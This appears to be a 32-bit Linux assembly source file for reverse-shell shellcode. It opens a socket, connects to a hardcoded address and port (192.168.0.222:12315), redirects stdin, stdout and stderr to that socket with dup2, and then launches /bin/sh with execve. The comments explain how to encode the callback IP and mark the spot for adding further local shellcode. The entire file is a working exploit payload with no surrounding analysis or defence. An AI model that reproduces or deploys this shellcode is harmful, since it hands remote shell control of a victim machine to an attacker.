	;; Connect back shellcode
	;; Handy One liner for IP
	;; ''.join(['%02x'%int(x)for x in'1.1.1.1'.split('.')][::-1])
	;; port is littleEndian
%include "short32.s"
%include "syscall.s"
%include "util.s"
	
%define IP   dword      ip(192,168,0,222) 
%define PORT word       htons(12315)	
%define AF_INET         2
%define SOCK_STREAM     1
%define ANY_PROTO       0
	
	;; Socketcall is the systemcall we use to manipulate sockets
	;; It is linux specific. Use man socketcall.
	;; first argument is an integer and second is an arg struct ptr

BITS 32
	global main

main:
	xor eax,eax
	mov ebx,eax
	push eax
	push byte SOCK_STREAM
	push byte AF_INET
	inc ebx			
	mov ecx,esp
	mov al,socketcall 
	SYSTEM_CALL		;socket() ebx=1
	
	;eax has socket
	inc ebx
	
IPandPort:
	push IP
	push PORT
	push bx 		;bx=2 AF_INET
	mov ecx,esp
	push byte 0x10		;size of sockaddr
	push ecx
	push eax		;socket fd
	inc ebx			;ebx=3 connect()
	mov ecx,esp
	SYSTEM_CALL(socketcall)
;;; connect reurns zero on success
	
	;; mov edi,eax		;connect fd
	pop ebx			;the top of the stack has our socket
	push byte 2
	pop ecx			;loop counter and fd arg for dup2

copy:
	mov al,dup2
	SYSTEM_CALL		;dup2(ebx,ecx)
;;; the system_call macro that takes an argument also zero is it out
;;; using extra bytes. We can save some space by assuming that
;;; dup2 won it error. 
	dec ecx
	jns copy
	
	;; Any local shellcode here

local32BinSh:
	; execve("/bin/sh", 0, 0)
	xor eax, eax
	push eax
	PUSH_STRING "/bin//sh"
	mov ebx, esp		; arg1 = "/bin//sh\0"
	mov ecx, eax		; arg2 = 0
	mov edx, eax		; arg3 = 0
	SYSTEM_CALL(execve)
 